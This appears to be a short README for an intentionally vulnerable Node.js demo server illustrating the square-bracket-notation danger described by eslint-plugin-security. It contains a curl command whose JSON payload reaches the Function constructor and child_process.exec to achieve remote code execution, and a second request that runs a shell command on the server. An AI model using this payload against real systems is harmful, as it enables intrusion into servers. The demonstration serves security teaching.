Example of vulnerable server based on [eslint plugin security](https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/the-dangers-of-square-bracket-notation.md)


To test, start server:
```bash
$ node index.js
```

Then, call the command to execute the RCE:
```bash
$ curl http://localhost:3000/api/user -H 'Content-Type: application/json' --data '["constructor", "var require = global.require || global.process.mainModule.constructor._load;require(\"child_process\").exec(arguments[0], console.log)"]'
$ curl http://localhost:3000/api/user -H 'Content-Type: application/json' --data '["anyVal", "date"]'
```

